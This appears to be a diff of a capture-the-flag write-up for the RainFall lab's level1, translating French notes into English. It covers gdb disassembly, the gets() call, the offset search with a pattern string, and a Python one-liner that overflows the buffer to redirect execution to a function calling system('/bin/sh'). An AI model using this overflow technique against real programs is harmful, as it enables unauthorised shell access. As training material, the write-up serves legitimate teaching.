@@ -11,11 +11,12 @@ Dump of assembler code for function main:
    0x08048496 <+22>:	ret
 End of assembler dump.
 
-On observe l'appel a gets() qui d'apres le man a un bug : "Because it is impossible
+We can see there a call to gets(). Here's the man "Because it is impossible
 to tell without knowing the data in advance  how  many  characters gets()  will  read,
 and  because  gets()  will continue to store characters past the end of the buffer"
 
-On lance la commande suivante pour verifier que nous avons rien oublier :
+We use this command to verify we didn't forget anything:
+
 (gdb) info function
 All defined functions:
 
@@ -29,7 +30,7 @@ Non-debugging symbols:
 0x08048480  main
 ...
 
-On observe un fwrite et system que nous n'avions pas remarque avant ainsi qu'une fontion run
+We see a fwrite and a system call in the run function
 
 (gdb) disass run
 Dump of assembler code for function run:
@@ -40,18 +41,16 @@ Dump of assembler code for function run:
 ...
 End of assembler dump.
 
-On observe l'appel a system qui prend pour parametre 0x8048584.
+There's a system call that take the 0x8048584 parameter
 
 (gdb) x/s 0x8048584
 0x8048584:	"/bin/sh"
 
-donc system va lancer /bin/sh
+system is going to launch /bin/sh
 
-Commencons notre recherche d'exploit. Gets nous permet de faire un buffer overflow
-Pour ca il faut d'abord trouver la taille de notre buffer
+Gets allows use to make a buffer overflow. To do that, we need to find the size of our buffer
 
-Je genere d'abord une string de 200 caractères (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
-qui ne contient pas 4 octets identiques.
+We use wiremask to find the offset (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
 
 (gdb) r
 Starting program: /home/user/level1/level1
@@ -60,11 +59,10 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 Program received signal SIGSEGV, Segmentation fault.
 0x63413563 in ?? ()
 
-je lance le programme avec la string genere, cela me donne l'endroit ou le programme crash.
-Et enfin grace a l'adresse du crash nous pouvons determiner la taille du buffer qui est de 76.
+The offset is 76.
 
-Nous allons essayer de reecrire EIP avec l'adresse de run afin de l'executer.
-Pour ca il nous faut une string de 76 characteres suivie de l'adresse de run 0x08048444.
+We re going the rewrite EIP with the run address to launch it.
+To do that, we need a string of 76 chars followed by the run address 0x08048444
 
 level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
 Good... Wait what?
